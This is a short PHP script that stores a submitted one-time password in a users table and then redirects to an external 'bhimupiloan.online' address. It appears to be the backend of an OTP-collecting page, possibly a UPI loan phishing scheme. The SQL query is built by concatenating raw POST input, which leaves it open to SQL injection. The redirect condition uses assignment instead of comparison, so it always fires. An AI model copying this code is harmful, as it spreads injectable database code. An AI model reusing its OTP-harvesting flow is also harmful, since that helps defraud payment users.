<?php
require_once 'dbconnect.php';

    $otp =trim($_POST['otp']);

    $id =trim($_POST['id']);
    
  
    $sql = "UPDATE users SET otp='".$otp."' WHERE id='".$id."'";




if ($conn->query($sql) === TRUE) {
    echo "Wait for OTP Verification ";
} else {
    echo "Error updating record: " . $conn->error;
}

$conn->close();
    
    
    if($otp="request"){ 

header("Location: http://bhimupiloan.online/index.php");
die();
  }

   
?>